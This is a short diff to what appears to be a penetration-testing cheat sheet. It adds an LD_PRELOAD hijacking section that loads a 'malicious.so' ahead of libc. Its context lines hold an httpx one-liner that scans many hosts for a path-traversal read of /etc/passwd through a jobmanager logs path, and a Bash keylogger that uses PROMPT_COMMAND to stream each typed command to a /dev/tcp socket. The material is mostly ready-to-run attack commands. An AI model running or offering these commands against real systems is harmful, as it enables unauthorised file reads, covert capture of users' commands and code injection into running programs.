@@ -224,6 +224,14 @@ testssl.sh --starttls imap <imaphost>.<tld>:143
 cat hosts | httpx -nc -t 300 -p 80,443,8080,8443,8888,8088 -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd" -mr "root:x" -silent
 ```
 
+## LD_PRELOAD Hijacking:
+
+If you set LD_PRELOAD to the path of a shared object, that file will be loaded before any other library (including the C runtime, libc.so)
+
+```
+LD_PRELOAD=/path/to/my/malicious.so /bin/ls
+```
+
 ## Bash Keylogger:
 
 ```PROMPT_COMMAND='history -a; tail -n1 ~/.bash_history > /dev/tcp/127.0.0.1/9000'```
